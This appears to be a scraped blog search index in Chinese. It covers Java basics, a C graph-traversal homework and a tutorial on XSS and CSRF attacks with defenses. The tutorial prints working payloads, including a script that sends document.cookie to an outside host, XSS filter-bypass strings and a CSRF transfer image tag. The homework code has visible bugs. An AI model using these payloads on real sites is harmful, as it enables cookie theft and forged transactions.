instanceof，用来判断是属于哪个类，对于工厂模式有用","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"JAVA学习第二天","slug":"day02","date":"2021-02-05T15:31:47.000Z","updated":"2021-02-05T15:38:15.211Z","comments":true,"path":"2021/02/05/day02/","link":"","permalink":"https://github.com/z-anshun/2021/02/05/day02/","excerpt":"","text":"面向对象面向对象具有的特征 封装性：即将其对象封装起来，并且实现“信息隐蔽”。也就是说只需要外界知道怎么使用，也不需要了解其细节，个别属性外界无法知道 继承性：顾名思义，儿子继承父级的一些方法。目的是为了增加代码的复用性，提高软件开发的效率。普通的继承只能是单类，若需要多类继承，则可以使用接口（interface）来实现多类继承 多态性：即允许程序中出现重名的现象，Java中含有方法重载和对象多态（子类对象和父类对象可以相互转换，而且可根据其使用不同的子类，完成不同的功能）两种。 类与对象类是一种基本特征抽象，对象就是一个个具体的东西。 即：类定义了一个模板（类似于接口，但接口没有继承性，多态性等），对象就是满足对应类的东西 类的定义1234567class 类名{ 数据类型 属性; ... public 返回的类型 funName(params){ } } 补充： 这里为什么没有static？ static声明，表示该方法由类调用，而不声明，就表示由对象调用 1234567891011121314151617181920212223public class main { public static void main(String args[]){ Person p=new Person(); p.name=\"as\"; p.age=20; // 这个对象只能调用没有static的方法 p.tell(); // 下面由类调用 Person.test(); }}class Person{ String name;// 如果这个前面加了static就可以认为这个name为这个类公用的一个变量 int age; public void tell(){ System.out.println(\"name=\"+name+\"\\tage=\"+age); System.out.println(this.getClass().getTypeName()); } public static void test(){ System.out.println(\"这里没有对象\"); }} 访问的属性private和public private为私有，而public为公有 即： 12345678class Person{ static String name;// 全局 int age;// 默认就是public，即对应的对象也能访问 private String proving;// 这个属性只能类内部能访问 public void tell(){ } } 那么，封装了的属性，即private声明的属性，外部能不能访问呢？ 答案肯定是可以的，我们可以调用使用setter和getter来调用 1234567public String getProving() { return proving;}public void setProving(String proving) { this.proving = proving;} 如果我们现在用一张图来表示Person Person +name:String +age:int -proving:String +getProving():void +setProving(String proving):void +tell():void 即：+属性名称:类型（-为private封装了的） 自定义构造方法规范 12345访问权限 类名(参数){ // 方法名必须跟类名一致 // 不能有返回的类型 // 不能有return返回} 例： 1234567891011121314class Person { static String name; int age; private String proving; public Person(){ System.out.println(\"构造了一个新对象\"); }}public class main{ public static void main(String args[]){ Person p=new Person() // 构造了一个对象 }} 其实即使自己不添加构造方法，在编译的过程中，也是会自行添加一个默认的构造方法的 如： 123456class Person(){ // 默认在编译的时候添加 public Person(){ }} 类图画表示构造函数 +&lt;&lt;Constructor&gt;&gt;Person() 总之，一个类，至少会有一个构造函数，如果没有自己添加，就会在编译时，系统默认添加。另外，即使是构造函数，其方法也是允许重载的 String在Java中，String不需要基础结构，而属于一个类 那么，我们来看如下的一段代码 123456789public class main { public static void main(String args[]) { String str1=\"as\";// 将已经开辟好的堆给str1，并放入String的内存池 String str2=new String(\"as\"); String str3=\"as\";// 因为重复，直接使用上面已经开好的堆 System.out.println(str1==str2);// false System.out.println(str1==str3);// true }} 很明显，直接String赋值，跟调用构造函数赋值是不一样的 这是因为str1和str2申请的不是同一个堆，即str2新开了一个空间，而直接赋值，相当于一个匿名对象 并且，对于String类的比较，“==”是比较其地址的值，并此String提供了一个专门比较String的方法 public boolean equals(String str) 尽力避免字符串的修改我们先看一段代码 1234567public class main { public static void main(String args[]) { String str=\"hello\"; str=str+\" world\"; System.out.println(str); }} 这里的字符串是能够修改的，但是，在这里，我们先申请了“hello”的堆，后面又申请了“ world”的堆，最后生成了“hello world”的堆。所以这里造成了内存浪费，在很多语言里，也是避免直接拼接字符串的，而尽量用buffer来 String的重载 public String(char[] value) public String(char[] value,int offset,int count) public String(byte[] bytes) public String(byte[] bytes,int offset,int length) 另外String还含有其它很多方法，更多可参考JDK文档 引用类java中的类为我们平时说的指针类型，也就是引用类 12345678910111213public class main { public static void main(String args[]) { Person p=new Person(); p.age=20; System.out.println(p.age);// 20 fun(p); System.out.println(p.age);// 21 } // 这里得用static，因为是直接由主方法调用，而不是对象 public static void fun(Person p){ p.age=21; }} 下面，我再看一段代码 123456789101112public class main { public static void main(String args[]) { String str1=\"as\"; System.out.println(str1);// as fun1(str1); System.out.println(str1);// as } public static void fun1(String s){ s=\"as12\"; }} 明明前面已经讲过，String是类，即str1为指针，那么这里为什么没有改变。 我们再想一下，再Java里，一个字符串，即一个String得匿名对象，换句话说，每个不同的字符串，都在不同的堆地址，那么，s=\"as12\";这里也只是改变了s指向的地址。（因为一开始 s 跟 str1 ，形参只是复制了形参的值罢了，所以并没有改变 str1 指向的位置） this关键字this 表示当前环境的对象（如果学过js的，就了解了） 这里指的是对象，不是类，也就是如果在当前方法里调用使用this调用static声明的方法，是不行的 补充：this()表示调用当前的构造函数(有参数就对应有参数的方法)，即:this() -&gt; this=new Person()。（只能在构造函数中使用，因为构造函数就是return this） static声明static声明的属性叫全局属性，也叫静态属性。 如果static声明的为类的属性，就是这个类的对象通用的属性（即一改均改）。 如果static声明的为类的方法，就是这个类通用的方法，并且本类的其它方法可直接调用 代码块123456789101112131415161718class Demo{ { System.out.println(\"1.构造块\"); } static { System.out.println(\"0.静态代码块\"); } public Demo(){ System.out.println(\"2.构造方法\"); }}public class main{ public static void main(String args[]){ new Demo(); new Demo(); }} 输出： 123450.静态代码块1.构造块2.构造方法1.构造块2.构造方法 从上我们看出，静态代码块最先执行，然后是构造块，最后才是构造方法（即使交换代码位置也一样） 并且，静态代码块只会执行一次（这点相当于init函数） 单态设计12345678910111213141516171819202122232425class Singleton { private static Singleton instance = new Singleton(); // 私有的构造函数 private Singleton() { } public static Singleton getInstance() { return instance; } public void print() { System.out.println(\"test\"); }}public class main { public static void main(String args[]) { Singleton s1 = Singleton.getInstance(); Singleton s2 = Singleton.getInstance(); Singleton s3 = Singleton.getInstance(); s1.print(); s2.print(); }} 这里的s1,s2,s3都是指向的同一个对象，还完成了很好的封装。只能由getInstance来构造对象（可以设计回收站等） 总结 对象：具有多态、继承和封装的性质 类（class）：每个类至少有一个构造函数，没有就使用默认的 private：代表私有属性，只能类的内部访问，提高了封装性 public：均可访问 static：全局属性（即类可调用），public static main(String args[])肯定必须是静态的方法才能给类调用 代码块：静态块只执行一次，然后是构造块，最后才是构造函数 单态设计：良好的封装，外部不能直接使用new进行构造","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"JAVA学习第一天","slug":"day01","date":"2021-02-04T14:28:28.000Z","updated":"2021-02-04T14:32:48.326Z","comments":true,"path":"2021/02/04/day01/","link":"","permalink":"https://github.com/z-anshun/2021/02/04/day01/","excerpt":"","text":"梦开始的地方12345public class main { public static void main(String[] args){ System.out.println(\"hello world\"); }} 前言Java的简介java具有三个发展方向，分别是 JAVA SE: JAVA的核心语言类，也是我要学的，主要是数据库的连接，接口的定义，输入/输出和网络编程 JAVA ME: 主要用于软件的开发 JAVA EE: 包含java se的类，还包含企业级应用的类 为什么要学java？ 简洁：前身是基于C++开发的OAK，从而省略了C++中个别繁琐的特性（当然，个人认为，golang还是更简洁一点） 可移植性：能够在多个平台上运行 面向对象： 适合分布式运算：这是最近比较热门的东西，因为java具有强大的联网能力，可以远程访问文件就像url一样访问远程对象一样 性能好 健壮、防患于未然：由于java具有伪编译这一层（即先将其转化为字节码，再解释），从而再伪编译时，就会将正常运行时的错误找出来 多线程 安全 动态语言：跟py一样 Java的运行机制计算机高级语言主要有编译性和解释性两种类型，而Java就是这两种类型的集合， 假设，我们写了一个main.java的文件，它会首先将它编译成main.class，然后再解释为字节。（这里要注意的是，执行这个class文件的是在JVM（Java Virtual Machine）上执行的，也就是一虚拟机，而java解释器就负着这个虚拟机的运行，所以跟计算机无关，提高了可移植性） 补充：这里的JVM会自己识别操作系统，从而进行不同的处理，换句话说，这里的JVM充当了一个翻译官的身份。 环境配置jetbrain 一键配置 Hello world!123456// 跟其它语言一样，main为入口public class main{ public static void main(String []args){ System.out.println(\"Hello world!\"); // Hello world! }} 补充：这里的String[] args、String []args和String args[]都是一样的 classpath在前面，我们已经提到过，每次的程序启动，都会创建一个JVM，而calsspsth，顾名思义，就是去寻找class的路径。我们可以通过set callspth=xxx来设置，默认就是当前目录 变量的声明由于java的是根据C++的，而C++又是根据C的，所以这里的变量声明是类似于C的 基本数据类型12345678910111213141516171819public class TestInt{ // 这里的main为主方法，class main就是主类 public static void main(String []args){ int num=10; // 这里不像go那样 var int num=10 long l = 10; short s=1; boolean t=true; float f= 1.022F; // 如果是小数，后面就得跟F。因为默认的小数的double，所以不加的话，在编译时就会出错 double d=2.22; // 这里得D可有可无 byte b='a'; char c='a'; char []ch={'a','s'}; System.out.println(num);// 10 System.out.printf(\"float=%f\\n\",f);//1.022000 System.out.printf(\"byte=%c\\nchar=%c\\n\",b,c);// a a System.out.println(ch);// as }} 注意，因为java里面都是类，所以这里的TestInt就是主类的名字，并且，这个类还必须和文件名一样 还有，对于public class和class的区别就是，public class必须跟文件名一样，而class不用 123456// 这里注意命名规范，类开头都要大写class Test{ public static void test(String args[]){ System.out.println(\"This is a test\"); }} 再补充一点，所以的数据初始默认为对应类型的0；~sum为输出sum的反码 注释 单行：// 多行：/* */ 文档：/** */ 扩大转换对于java是强类型语言，你不能直接去改变一个类型，只能调用相应的函数或方法，即显示的转换它。因此，java里的类型转换是安全的，比如short专int，只能往占用内存大的转换，并且在表达式中，如果byte这些，都默认为int 如： 1234567public class main{ public class void main(String []args){ float f=1.0F; int i=(int)f; System.out.Println(i);// 1 }} 运算符基础，自行解决 选择和循环基础就不提了 注意的是switch跟c一样，每次判断后需要break，如： 12345678910111213public static void sw() { int i = 10; switch (i/2) { case 1: break; case 2: break; case 3: break; default: System.out.println(\"default\"); }} if if else while do while for(初值;判断条件;操作) 如： 12345678910class ForNestedDemo{ public static void main(){ for(int i=1;i&lt;=9;i++){ for(int j=1;j&lt;=i;j++){ System.out.print(i+\"*\"+j+\"=\"+i*j+\"\\t\"); } System.out.println(); } }} 数组12345678class Arr{ public static void main(){ int arr[]=null; arr=new int[10]; arr[0]=1; System.out.println(arr.toString()); }} 这里，因为数组为引用类型，所以初始定义为null，后面再用new构造 虽然，再JDK1.5后，不必对数组地址进行初始化，但为了规范，最好还行进行初始化 补充：引用类的地址属于栈分配，而数据属于堆分配。即上面的arr为栈分配的，arr[3]为堆分配的 二维跟一维类似，这里就不提了 12345678class Arr{ public static void main(){ int arr[][][]=null; arr=new int[1][1][1]; arr[0][0][0]=12; System.out.println(arr[0][0][0]); }} 但是，这里的构造new直接就可构造几维的，不需要像golang，c那样层层的构造 方法声明1234public static 返回类型 方法名(参数){ 语句; return xxx; // 只有在返回类型为void时，可以省略} 如果只主类的主方法，就是一定要带上public，其它的，可带可不带 命名规范跟类不同，类是每个单词的首字母大写，而方法是第一个单词的首字母小写，其它大写（如：addOne,addTwo） 方法的重载首先，我们思考一个问题，System.out.println()为什么能打印整形，字符串，布尔等类型呢？ 我们再来看一段代码 123456789101112131415public class main { public static void main(String args[]) { add(1,2); add(1,2,3); } static int add(int x,int y){ return x+y; } static int add(int x,int y,int z){ return x+y+z; } static float add(float x,float y){ return x+y; }} 很明显，这个程序是没有错误的，换句话说，在JAVA里面，即使方法名相同，参数不同，都会被当成不同的函数。 因此，System.out.println()会自动寻找其对于的方法 注意：重载只在参数上，不在返回类型上，即： static int add(int x,int y)和static float add(int x,int y)会被认为是同一个方法 可变参数public static fun(int... arg) 跟go类似，便不再多提 foreach类型于for range 如： 12345public static void fun(int... arg) { for (int x : arg) { System.out.println(x); }} 总结： JAVA的优点 JVM提供的可移植性 类 class，主类public class（主类必须和文件名一致） 方法 static int fun(params)，主方法public int main(String args[]) 命名规范 类的首字母大写，方法就第一个单词首字母小写 方法的重载，类似于golang的接口（都是找到对应方法），但重载只在于参数 foreach类似于go的for rang，python的for in","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"数据结构作业","slug":"work","date":"2020-11-30T13:57:35.000Z","updated":"2020-11-30T13:56:44.128Z","comments":true,"path":"2020/11/30/work/","link":"","permalink":"https://github.com/z-anshun/2020/11/30/work/","excerpt":"","text":"数据结构作业T1邻接矩阵的做法首先，先声明邻接矩阵的结构体 12345678910111213141516171819202122232425262728293031int Visited[MAX_VERTEX_NUM]; /*访问标志数组(全局量) 用于访问标记*/// 图的数据结构：邻接多重表typedef enum{ unvisited, visited} VisitIf;// 邻接多重表的边typedef struct EBox{ VisitIf mark; // 访问标记 int ivex, jvex; // 两个顶点位置 struct EBox *ilink, *jlink; // 两个顶点的下一条边 char *info; // 和边的有关信息} EBox;// 表头结点typedef struct VexBox{ char data; // 对应数据 EBox *firstedge; // 指向第一条依附该顶点的边} VexBox;// 邻接多重表typedef struct{ VexBox adjmulist[MAX_VERTEX_NUM];c int vexnum, edgenum; // 顶点数和边数} AMLGraph; 然后声明三个函数（这里可不用出现在作业里，而且我也在网上copy的，只是为了方便理解），分别是： LocateVex: 根据值，找到对应的顶点 FirstAdjvex: 找到该结点的第一个邻接顶点 NextAdjvex: 找到该结点的下一个邻接顶点 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263int LocateVex(AMLGraph *G, char u) //在邻接多重表定位u顶点{ int i; for (i = 0; i &lt; G-&gt;vexnum; i++) if (u == G-&gt;adjmulist[i].data) return i; return -1;}//返回v的顶点值int FirstAdjvex(AMLGraph *G, char v) //寻找v点的第一邻接点{ int i; i = LocateVex(G, v); //定位V顶点 if (i &lt; 0) return -1; else if (G-&gt;adjmulist[i].firstedge != NULL) //说明该顶点存在邻接点 { if (G-&gt;adjmulist[i].firstedge-&gt;ivex == i) //如果该顶点所接边的ivex是i的话 { return G-&gt;adjmulist[i].firstedge-&gt;jvex; //该顶点的邻接点是jvex } else return G-&gt;adjmulist[i].firstedge-&gt;ivex; //否则该顶点的邻接点是ivex } else return -1;}int NextAdjvex(AMLGraph *G, char v, char w) //寻找v顶点的邻接点w的下一邻接点{ int i, j; EBox *p; i = LocateVex(G, v); //分别寻找i顶点和j顶点 j = LocateVex(G, w); if (i &lt; 0 || j &lt; 0) return -1; p = G-&gt;adjmulist[i].firstedge; //p指向顶点v的第一条边 while (p != NULL) if (p-&gt;ivex == i &amp;&amp; p-&gt;jvex != j) //不是邻接顶点(情况1) p = p-&gt;ilink; //找下一邻接顶点 else if (p-&gt;jvex == i &amp;&amp; p-&gt;ivex != j) //不是邻接顶点(情况2) p = p-&gt;jlink; //找下一邻接顶点 else break; //否则是邻接顶点 if (p &amp;&amp; p-&gt;ivex == i &amp;&amp; p-&gt;jvex == j) //找到邻接顶点w (情况1) { p = p-&gt;ilink; if (p &amp;&amp; p-&gt;ivex == i) return p-&gt;jvex; else if (p &amp;&amp; p-&gt;jvex == i) return p-&gt;ivex; } if (p &amp;&amp; p-&gt;ivex == j &amp;&amp; p-&gt;jvex == i) //找到邻接顶点w (情况2) { p = p-&gt;jlink; if (p &amp;&amp; p-&gt;ivex == i) return p-&gt;jvex; else if (p &amp;&amp; p-&gt;jvex == i) return p-&gt;ivex; } return -1;} 最后，实现要求（总的来说就是遍历问题） 1234567891011121314151617181920212223242526272829303132333435363738// 要求：判断一个无向图G是否为一颗树// 思路：图连通图，为n为顶点数，边数为（2*n-1)的图为树// 时间复杂度: O(n)int JudgeIsTree(AMLGraph *G){ int vNum, eNum = 0; // 遍历的结点数和边数 // 这里采用深度优先搜索 DFS(G, 0, vNum, eNum); if (vNum == G-&gt;vexnum &amp;&amp; eNum == 2 * (G-&gt;vexnum - 1)) return 1; else return 0;}void DFS(AMLGraph *G, int v, int *vNum, int *eNum) //从顶点v开始深度优先遍历{ char u; // 该结点的data int w; Visited[v] = 1; //遍历后v点标志域改为1 (*vNum)++; // 结点数+1 u = G-&gt;adjmulist[v].data; // 遍历该结点的边 // FirstAdjve -&gt; 返回u的第一个邻接点 NextAdjvex -&gt; 返回w的下一个邻接点 for (w = FirstAdjvex(G, u); w &gt;= 0; w = NextAdjvex(G, u, G-&gt;adjmulist[w].data)) { (*eNum)++; // 边数 +1 // 如果还没有访问的结点,则继续访问 if (Visited[w] == 0) { DFS(G, w, vNum, eNum); } }} 邻接矩阵实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt;#define MaxSize 50 /*最大顶点个数*/typedef enum{ DG, DN, UG, UN} GraphKind; /*图的类型：有向图、有向网、无向图和无向网*/typedef struct ArcNode /*边表结点的类型定义*/{ int adjvex; /*弧指向的顶点的位置*/ char *info; /*与弧相关的信息*/ struct ArcNode *nextarc; /*指示下一个与该顶点相邻接的顶点*/} ArcNode;typedef struct VNode /*表头结点的类型定义*/{ char data; /*用于存储顶点*/ ArcNode *firstarc; /*指示第一个与该顶点邻接的顶点*/} VNode, AdjList[MaxSize];typedef struct /*图的类型定义*/{ AdjList vertex; int vexnum, arcnum; /*图的顶点数目与弧的数目*/ GraphKind kind; /*图的类型*/} AdjGraph;int visited[MaxSize];// 时间复杂度：O(n)int JudgeIsTree(AdjGraph *G){ int vNum, eNum = 0; // 遍历的结点数和边数 // 这里采用深度优先搜索 DFS(G, 0, vNum, eNum); if (vNum == G-&gt;vexnum &amp;&amp; eNum == 2 * (G-&gt;vexnum - 1)) return 1; else return 0;}// 深度优先搜索遍历结点void DFS(AdjGraph *G, int v, int *vNum, int *eNum){ ArcNode *p; visited[v] = 1; // 标记已遍历 (*vNum)++; // 已遍历节点数+1 p = G-&gt;vertex[v].firstarc; // 获取头部结点指向的第一个 while (p != NULL) { (*eNum)++; // 边数+1 // 如果该结点未被遍历，就递归进行DFS if (visited[p-&gt;adjvex] == 0) DFS(G, p-&gt;adjvex, vNum, eNum); // 下一个结点 p = p-&gt;nextarc; }} T2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;stdio.h&gt;#define MaxSize 50 /*最大顶点个数*/typedef enum{ DG, DN, UG, UN} GraphKind; /*图的类型：有向图、有向网、无向图和无向网*/typedef struct ArcNode /*边表结点的类型定义*/{ int adjvex; /*弧指向的顶点的位置*/ char *info; /*与弧相关的信息*/ struct ArcNode *nextarc; /*指示下一个与该顶点相邻接的顶点*/} ArcNode;typedef struct VNode /*表头结点的类型定义*/{ char data; /*用于存储顶点*/ ArcNode *firstarc; /*指示第一个与该顶点邻接的顶点*/} VNode, AdjList[MaxSize];typedef struct /*图的类型定义*/{ AdjList vertex; int vexnum, arcnum; /*图的顶点数目与弧的数目*/ GraphKind kind; /*图的类型*/} AdjGraph;int visited[MaxSize];// 要求:非递归实现邻接表的DFS// 思路：能用递归完成，基本都能用栈实现，在需要递归的地方，将结点信息存入栈中，然后再取出// 时间复杂度：O(n)void DFS(AdjGraph *G, int v){ ArcNode *p; int top; Stack s; // 假设这是跟栈，储存结点信息 // 开始遍历 for (int i = 0; i &lt; G-&gt;vexnum; i++) { // 如果该点未被遍历 if (!visited[i]) { visited[i] = 1; // 标记 PushStack(*s, i); // 进栈 p = G-&gt;vertex[i].firstarc; // 获取该点的第一个邻接结点 // 循环，直到栈不空 while (!StackIsEmpty(s)) { while (p) { if (!visited[p-&gt;adjvex]) { visited[p-&gt;adjvex] = 1; PushStack(*s, p-&gt;adjvex); // 进栈 p = G-&gt;vertex[p-&gt;adjvex].firstarc; } else p = p-&gt;nextarc; } top = PopStack(s, *top); // 出栈，并将栈顶元素赋给top p = G-&gt;vertex[top].firstarc; } } }} 这里栈功能我并没有去写出实现（主要是麻烦），当然，栈也可也存结点，我这里只是存的结点信息（也就是在AdjList的位置）","categories":[{"name":"作业","slug":"作业","permalink":"https://github.com/z-anshun/categories/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://github.com/z-anshun/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"XSS攻击和CSRF攻击","slug":"xss","date":"2020-10-25T04:40:21.000Z","updated":"2020-10-25T04:59:00.013Z","comments":true,"path":"2020/10/25/xss/","link":"","permalink":"https://github.com/z-anshun/2020/10/25/xss/","excerpt":"","text":"XSS攻击 “XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。”【摘自维基百科】 xss 主要分为三类： DOM xss :DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。 反射型 xss :反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。 存储型 xss :存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。 说白了就是当你游览一下页面的时候，它可能就会窃取一些你的信息 DOM xss我们先来看一个例子 12345678910&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=”board”&gt; &lt;script&gt;alert(\"hello world\")&lt;/script&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 这是一段很简单的HTML代码，当你访问这个页面的时候，就会有提示框弹出 虽然这里是“hello world”，但在真正的xss攻击中，还能做很多事情 比如： 1.窃取网页浏览中的cookie值 ​ js中有这样一个代码document.cookie，相信这个大家都知道吧，就是获取cookie，但是假设这个cookie是你登录某个页面时留下来的，这个cookie就相当于你的令牌。换句话说如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号 你都可以登录 不过我们也可以设置：Http-Only（只有在http请求头中会有此cookie信息，而不能通过document.cookie来访问此cookie） 保证同一cookie不能被滥用 2.劫持流量实现恶意跳转 ​ 试想一下，有这样一段代码 1&lt;script&gt;window.location.href=\"http://www.baidu.com\";&lt;/script&gt; 那么所访问的网站就会被跳转到百度的首页（该代码就是当有人访问这个页面的时候，这个事件都会发送，从而实现跳转） 据了解：在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博 反射型 xss反射型xss主要运用的是利用与绕过 大小写绕过 个别网站可能会过滤掉script标签，但是却没想到标签中的大小写并不影响浏览器的解释 如下： 1http://192.168.1.102/xss/example2.php?name=&lt;sCript&gt;alert(\"hey!\")&lt;/scRipt&gt; 如果访问这个网站，就会打印出‘hey’，换句话说&lt;script&gt;中的脚本被执行了 利用过滤后的返回语句再次构成攻击语句来绕过攻击 换句话说就是让过滤掉后了的语句中任有 script 标签 如： 1http://192.168.1.102/xss/example3.php?name=&lt;sCri&lt;script&gt;pt&gt;alert(\"hey!\")&lt;/scRi&lt;/script&gt;pt&gt; 这个了只过滤掉了 &lt;sCri 和 &lt;/scRi，但仍还有 script 标签，也就是仍然可以执行脚本 插入其它标签的代码 首先，并不是只有script标签的插入能够植入脚本的 比如 1http://192.168.1.102/xss/example4.php?name=&lt;img src='w.123' onerror='alert(\"hey!\")'&gt; 这里虽然插入的img标签，但该标签中的onerror事件任然执行了，也到达到了其目的 再比如 1&lt;a onmousemove=’do something here’&gt; 这里的onmousemove也能触发事件，其它还有onclick（点击事件发生）、onmouseenter（鼠标指针移动到元素上时触发事件）这类的，这些就涉及到一些前端的了，我在这里就不赘述 编码要植入的脚本代码绕过关键字的过滤 js中有个eval()方法，会将编码过的语句解码后再执行，从而便能绕过关键字过滤，如： 1http://192.168.1.102/xss/example5.php?name=&lt;script&gt;eval(\\u0061\\u006c\\u0065\\u0072\\u0074(1))&lt;/script&gt; 这里的\\u0061\\u006c\\u0065\\u0072\\u0074(1)，是alert(1)编码后的 主动闭合标签实现注入 我们先来看一份代码截图 这里，直接在js中拿取变量，但是，js不像go语言那种强类型语言，js是弱类型的，也就是对变量并没有明确的定义，所以当我们输入： 12http://192.168.1.102/xss/example6.php?name=\";alert(\"I am ahacker~\");\" 其代码就变成了这样，完成了脚本的植入 存储型 xss储存，就如字面上的意思，讲恶意代码储存在数据库里，通常是在留言板使用（可以设想一下，当一个人读留言板时，服务器肯定会向用户展示留言板的内容，但如果留言板储存的恶意脚本，不就执行了？就跟上面新浪微博的那个事件一样），这个跟反射型 xss不同的是，只需要用户访问这个页面就行了 这个跟DOM类型的 xss很相似 比如你在一个留言板上这么写 12345&lt;script&gt; while (true) { alert('Hello') }&lt;/script&gt; 那这个网站就可能会挂 或者这么写 123456&lt;script&gt; var img = document.createElement('img') img.src='http://www.xss.com?cookie=' + document.cookie img.style.display='none' document.getElementsByTagName('body')[0].appendChild(img) &lt;/script&gt; 这就就是将你该页面的cookie发送到http://www.xss.com这个网址（这个跟后面要说csrf是有点不一样，但一般是这两种混合来使用） 如何预防xss？ 首先是过滤。对诸如&lt;script&gt;、&lt;img&gt;、&lt;a&gt;等标签进行过滤。（尽管可能会逃过） 其次是编码。像一些常见的符号，如&lt;&gt;在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。 最后是限制。通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御（这里要记住，不能只是单纯的在表单里设置长度，因为是可以改的） CSRF攻击说完了上面的xss攻击，现在，我们来看看csrf攻击 概念：CSRF攻击，英文全称为Cross-site request forgery，中文的名称为跨站请求伪造，也被称为one click attack/session riding，其缩写为CSRF/XSRF,是一种非常常见的Web攻击方式 换句话说：就是hacker盗取了你的信息（比如 cookie，token这些），然后再以你的名义发送请求 比如： 首先用户在A网站登录了支付宝，然后支付宝把cookie返回给了游览器，但是，该用户在还没退出A网页时，又登录了恶意网站B，然后B网站又发送了一些带攻击型的代码，发送请求要求访问A网站，在这种情况下，用户并不知道发生了什么，但A网站是根据发了的cookie权限处理该请求的，并不知道该请求其实是由B发起的。 举个例子 如果某个银行网站，对转账的请求为：http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 那么如果在网站B上，有这样一行代码 1&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt; 这里的以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），而又恰好你刚刚登录了A网站，游览器还存又cookie，所以当你登录B网站时，浏 览器会带上你的银行网站A的Cookie发出Get请求 虽然这只是一个简单的例子，但即使该银行换成只能post表单请求，但B网站也能发送POST表单请求，这里我就不赘述了 其实可以看出，CSRF攻击是源于WEB的隐式身份验证机制，WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的（也就是即是我们拿到了令牌，也不知道是否是用户批准的） 如何防御？ 验证码， 强制让用户在进行每次操作的时候输入验证码，以便让他知道自己在干什么（虽然这样给用户的体验会很不好） 检查HTTP Referer字段 在HTTP请求中，Referer字段的数据会带着上一次请求的地址，因此我们通过获取Referer字段，检测该字段是否为我们自己的站点地址，这样就可以避免CSRF攻击 但是这也有缺点 用户设置禁止发送Referer字段（跟设置禁止保存cookie是一样的） 个别插件可以伪造Referer字段 设置Token 很明显，CSRF攻击的本质是攻击者可以猜测到构造一个请求所需要的参数（也就是令牌），那么，如果要防御，其方法就是让参数变得不可猜测，token就可以做到 但要注意的是 token必须保密（也就是加密） 提交token时，不可直接放在url中（所以我们直接放在头部） 避免全站通用cookie，设置好cookie的域 总结：CSRF利用的是网站的令牌去请求，这属于网站本身的漏洞 XSS属于的是注入攻击，大多在留言板上（虽然现在一般的网址已经不行了）","categories":[{"name":"技术交流","slug":"技术交流","permalink":"https://github.com/z-anshun/categories/%E6%8A%80%E6%9C%AF%E4%BA%A4%E6%B5%81/"}],"tags":[{"name":"web攻击","slug":"web攻击","permalink":"https://github.com/z-anshun/tags/web%E6%94%BB%E5%87%BB/"}]},{"title":"初步了解区块链与微服务","slug":"struct","date":"2020-10-19T13:53:49.000Z","updated":"2020-10-25T07:01:55.353Z","comments":true,"path":"2020/10/19/struct/","link":"","permalink":"https://github.com/z-anshun/2020/10/19/struct/","excerpt":"","text":"因为对于个人而言，我经常搞混区块链和分布式，所以便狠下决心写了这篇文章 区块链 概念：从科技层面来看，区块链涉及数学、密码学、互联网和计算机编程等很多科学技术问题。从应用视角来看，简单来说，区块链是一个分布式的共享账本和数据库，具有去中心化、不可篡改、全程留痕、可以追溯、集体维护、公开透明等特点【摘自百度百科】 主要运用于金融、物联网和物流领域、公共服务领域等 1.要了解区块链，我们先来了解一个概念 去中心化去中心化 在一个分布有众多节点的系统中，每个节点都具有高度自治的特征。节点之间彼此可以自由连接，形成新的连接单元。任何一个节点都可能成为阶段性的中心，但不具备强制性的中心控制功能。节点与节点之间的影响，会通过网络而形成非线性因果关系。这种开放式、扁平化、平等性的系统现象或结构，我们称之为去中心化【摘自百度百科】 